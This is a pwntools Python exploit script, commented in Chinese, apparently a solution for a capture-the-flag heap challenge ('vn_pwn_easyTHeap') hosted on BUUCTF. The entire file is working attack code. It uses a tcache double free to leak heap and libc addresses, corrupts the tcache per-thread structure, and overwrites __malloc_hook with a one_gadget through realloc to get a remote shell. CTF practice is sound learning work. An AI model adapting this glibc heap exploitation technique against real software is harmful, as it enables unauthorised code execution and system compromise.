from pwn import *
from LibcSearcher import LibcSearcher

io = -1
############################
#********修改文件名**********
############################
file_name = 'vn_pwn_easyTHeap'
port = 27974

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
tcache attack
'''


def Add(size:int):
    assert size <= 0x100 and size > 0, "error!"
    global io
    io.sendafter("choice: ", b'1')
    io.sendlineafter("size?", str(size).encode())
    io.recvuntil("Done!\n")


def Edit(idx:int, content:bytes):
    assert idx <= 6 and idx >= 0, 'error!'
    global io
    io.sendafter("choice: ", b'2')
    io.sendlineafter("idx?", str(idx).encode())
    io.sendafter("content:", content)
    io.recvuntil("Done!\n")


def Show(idx:int):
    assert idx <= 6 and idx >= 0, 'error!'
    global io
    io.sendafter("choice: ", b'3')
    io.sendlineafter("idx?", str(idx).encode())
    return io.recvuntil("Done!\n")


def Delete(idx:int):
    assert idx <= 6 and idx >= 0, 'error!'
    global io
    io.sendafter("choice: ", b'4')
    io.sendlineafter("idx?", str(idx).encode())
    io.recvuntil("Done!\n")

# Add(0x10)
# Delete(0)
# STOP()

Add(0x100) # 0

Add(0x60) # 1
Delete(1)
Delete(1)

msg = Show(1)
leak_heap_addr = msg[:2]
leak_heap_addr = u16(leak_heap_addr.ljust(2, b'\x00'))
LOG_ADDR_SUCCESS('leak_heap_addr', leak_heap_addr)

prethread_addr = 0xf000 & leak_heap_addr
LOG_ADDR_SUCCESS('prethread_addr', prethread_addr)


Add(0x60) # 2
Edit(2, p16(prethread_addr + 0x10))
Add(0x60) # 3
Add(0x60) # 4

Edit(4, b'\x00'*0xf + b'\x07')
Delete(0)
leak_addr = Show(0)
main_arena_addr = u64(leak_addr[:6].ljust(8, b'\x00')) - 0x60
malloc_hook_addr = main_arena_addr - 0x10
LOG_ADDR_SUCCESS('main_arena_addr', main_arena_addr)
LOG_ADDR_SUCCESS('malloc_hook_addr', malloc_hook_addr)

offset = 0x3ebc40
libc_base_addr = main_arena_addr - offset
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base_addr + gadget[2]
realloc_addr = 0x98C30 + libc_base_addr

LOG_ADDR_SUCCESS('libc_base_addr', libc_base_addr)
LOG_ADDR_SUCCESS('one_gadget', one_gadget)
LOG_ADDR_SUCCESS('realloc_addr', realloc_addr)
Edit(4, b'\x01' + b'\x00'*0xe + b'\x07' + p64(0) * 6 + p64(malloc_hook_addr - 8))

Add(0x10) # 5
Edit(5, p64(one_gadget) + p64(realloc_addr + 0x6))

io.sendafter("choice: ", b'1')
io.sendlineafter("size?", str(0x10).encode())


io.interactive()
